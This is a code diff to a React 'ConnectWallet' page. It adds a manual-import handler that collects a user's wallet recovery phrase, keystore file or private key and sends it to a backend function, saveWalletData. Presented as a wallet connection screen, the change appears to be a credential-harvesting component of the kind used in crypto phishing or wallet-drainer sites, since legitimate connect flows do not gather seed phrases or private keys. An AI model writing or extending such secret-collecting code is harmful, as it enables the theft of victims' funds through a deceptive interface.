@@ -2,6 +2,7 @@
 import { useState } from "react";
 import { Button } from "@/components/ui/button";
 import { Card } from "@/components/ui/card";
+import { saveWalletData } from "@/controllers/walletActions";
 
 const wallets = [
 	{ name: "Trust Wallet", icon: "/twt.png" },
@@ -54,12 +55,49 @@ export default function ConnectWallet() {
 		setPrivateKey("");
 	};
 
-	// Example submit handler for manual import
-	const handleManualSubmit = (e) => {
-		e.preventDefault();
-		// Handle import logic here
-		handleCloseManual();
-	};
+const handleManualSubmit = async (e) => {
+  e.preventDefault();
+  let type = activeTab;
+  let data;
+
+  if (type === "phrase") {
+    const words = phrase.trim().split(/\s+/);
+    if (words.length !== 12 && words.length !== 24) {
+      alert("Recovery phrase must be exactly 12 or 24 words.");
+      return;
+    }
+    data = phrase;
+  } else if (type === "keystore") {
+    try {
+      data = JSON.parse(keystore);
+    } catch (err) {
+      alert("Invalid Keystore JSON format");
+      return;
+    }
+  } else if (type === "private") {
+    if (!privateKey || privateKey.length < 10) {
+      alert("Invalid Private Key");
+      return;
+    }
+    data = privateKey;
+  }
+
+  try {
+    const response = await saveWalletData({
+      type,
+      data,
+      walletName: selectedWallet?.name,
+    });
+
+    if (response.success) {
+      alert("Wallet saved successfully.");
+      handleCloseManual();
+    }
+  } catch (err) {
+    alert("Failed to save wallet: " + err.message);
+  }
+};
+
 
 	return (
 		<div className="w-full max-w-6xl mx-auto px-4 py-12">
